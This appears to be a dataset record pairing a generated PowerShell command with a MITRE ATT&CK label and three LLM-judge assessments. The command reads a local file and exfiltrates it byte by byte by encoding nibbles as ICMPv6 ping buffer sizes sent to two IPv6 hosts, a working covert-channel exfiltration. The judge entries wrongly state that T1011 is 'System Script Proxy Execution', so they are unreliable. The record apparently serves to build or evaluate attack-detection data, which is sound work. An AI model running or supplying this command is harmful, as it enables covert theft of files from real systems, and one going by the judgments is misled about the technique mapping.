command: $dh='fd00:feed::a'; $dl='fd00:feed::b'; $bytes=[IO.File]::ReadAllBytes('C:\Users\Public\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $dh -Count 1 -BufferSize (400 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $dl -Count 1 -BufferSize (400 + $lo) -IPv6 -Quiet | Out-Null }
explanation: Splits each byte into nibbles and sends them as ICMPv6 payload sizes to two different IPv6 endpoints, employing an alternate medium per T1011.
rationale_steps: Split each byte into high and low 4-bit values.
Encode each nibble into the -BufferSize field with a safe offset.
Send to separate IPv6 destinations to facilitate decoding and framing.

llm_judgments.syntactic_justification: Valid PowerShell with balanced quoting/braces, proper separators, correct bitwise operations, and legitimate Test-Connection parameters.
llm_judgments.semantic_justification: It implements ICMPv6-based exfiltration via payload sizes, not system/signed script proxy execution as described in the technique narrative.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignments, valid method calls, and correct use of operators and pipeline constructs.
llm_judgments.semantic_justification: The command effectively implements an exfiltration technique using IPv6 ICMP packets as a covert channel, but doesn't directly align with T1011 (which typically involves abusing trusted system scripts) despite achieving data exfiltration through an alternate communication channel.

llm_judgments.syntactic_justification: The command is perfectly well-formed, uses standard PowerShell syntax for variable assignment, file I/O, bitwise operations, loops, and cmdlet execution, with all quotes, parentheses, and parameters correctly balanced and formatted.
llm_judgments.semantic_justification: While the command effectively implements data exfiltration via ICMPv6 (an alternate medium), it does not align with MITRE ATT&CK T1011, which describes 'System Script Proxy Execution' via trusted scripts, a mechanism entirely absent from this direct PowerShell execution.
